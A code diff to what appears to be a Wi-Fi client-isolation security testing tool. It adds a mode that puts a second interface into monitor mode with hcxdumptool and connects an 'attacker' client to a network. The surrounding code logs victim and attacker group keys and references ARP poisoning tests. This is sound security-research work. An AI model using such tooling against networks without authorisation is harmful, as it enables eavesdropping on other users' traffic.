@@ -99,6 +99,56 @@ class Daemon(metaclass=abc.ABCMeta):
 			self.process.wait()
 
 
+class Monitor(Daemon):
+	def __init__(self, iface, options):
+		super().__init__(options)
+		self.nic_iface = iface
+		self.sock_mon  = None
+		self.netid_attacker = None
+		self.netid_victim = None
+		self.bssid_attacker = None
+		self.bssid_victim=None
+
+		self.mac = get_macaddress(self.nic_iface)
+		self.clientip = None
+		self.routermac = None
+		self.routerip = None
+		self.arp_sock = None
+		self.can_send_traffic = False
+
+		self.dhcp_xid = None
+		self.dhcp_offer_frame = False
+		self.time_retrans_dhcp = None
+		self.dhcp_retrans_attempts = None
+		self.time_retrans_arp = None
+		self.arp_retrans_attempts = None
+
+		self.tcp_src_port = None
+		self.tcp_src_seq = None
+		self.has_reconnected = False
+		self.time_syn = None
+		self.time_last_synack = None
+
+		self.eth_handler = None
+
+	def start(self):
+		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
+		subprocess.check_output(["rfkill", "unblock", "wifi"])
+
+		cmd1 = ["hcxdumptool", "-i", self.nic_iface, "-c", str(self.options.c2m_mon_channel)]
+		cmd2 = ["hcxdumptool", "-m", self.nic_iface]
+		log(STATUS, f"Starting monitor mode using hcxdumptool on {self.nic_iface} (Channel {self.options.c2m_mon_channel})")
+
+		subprocess.Popen(cmd1)
+		subprocess.Popen(cmd2)
+
+		self.sock_mon = MonitorSocket(type=ETH_P_ALL, iface=self.nic_iface)
+
+	def stop(self):
+		if self.sock_mon: self.sock_mon.close()
+		super().stop()
+
+
 class Supplicant(Daemon):
 	def __init__(self, iface, options):
 		super().__init__(options)
@@ -755,6 +805,36 @@ class Client2Client:
 			attacker_gtk = self.sup_attacker.get_gtk()
 			log(STATUS, f">>> The victim's GTK is ({victim_gtk}).", color="green")
 			log(STATUS, f">>> The attacker's GTK is ({attacker_gtk}).", color="green")
+
+class Client2Monitor:
+	def __init__(self, options):
+		self.monitor = Monitor(options.c2m_ip, options)
+		self.sup_attacker = Supplicant(options.iface, options)
+		self.options = options
+
+	def stop(self):
+		# self.sup_victim.stop()
+		self.monitor.stop()
+		self.sup_attacker.stop()
+
+	def run(self):
+		# Start both clients
+		self.monitor.start()
+		self.sup_attacker.start()
+		# self.sup_victim.scan(wait=False)
+		self.sup_attacker.scan(wait=False)
+		# self.sup_victim.wait_scan_done()
+		self.sup_attacker.wait_scan_done()
+
+		# Let both client connects
+		log(STATUS, f"Connecting as {self.sup_attacker.id_attacker} using {self.sup_attacker.nic_iface} to the network...", color="green")
+		self.sup_attacker.connect(self.sup_attacker.netid_attacker, timeout=60)
+		data = self.sup_attacker.status()
+		bssid = data['bssid']
+
+		# Let both clients get an IP address
+		# self.sup_victim.get_ip_address()
+		self.sup_attacker.get_ip_address()
 			
 
 def cleanup():
@@ -778,7 +858,9 @@ def main():
 	parser.add_argument("--no-id-check", default=False, action="store_true", help="Allow attack test with same victim/attacker identity.")
 	parser.add_argument("--c2c", help="Second interface to test client-to-client Ethernet ARP poisoning traffic.")
 	parser.add_argument("--c2c-eth", help="Second interface to test client-to-client Ethernet traffic.")
-	parser.add_argument("--c2c-ip", help="Second interface to test client-to-client Ethernet ARP poisoning and IP layer traffic.")
+	parser.add_argument("--c2c-ip", help="Second interface to test client-to-client IP layer traffic.")
+	parser.add_argument("--c2m-ip", help="Second interface to test client-to-monitor IP layer traffic, by setting it to monitor mode")
+	parser.add_argument("--c2m-mon-channel", type=int, help="The monitored channel for that c2m's second interface")
 	parser.add_argument("--fast", help="Fast override attack using second given interface.")
 	parser.add_argument("--check-gtk-shared", help="Checking if second given interface receives the same GTK from BSSID.")
 	options = parser.parse_args()
@@ -807,7 +889,9 @@ def main():
 
 	change_log_level(-options.debug)
 
-	if not options.c2c:
+	if options.c2m_ip:
+		test = Client2Monitor(options)
+	elif not options.c2c:
 		test = Supplicant(options.iface, options)
 	else:
 		test = Client2Client(options)
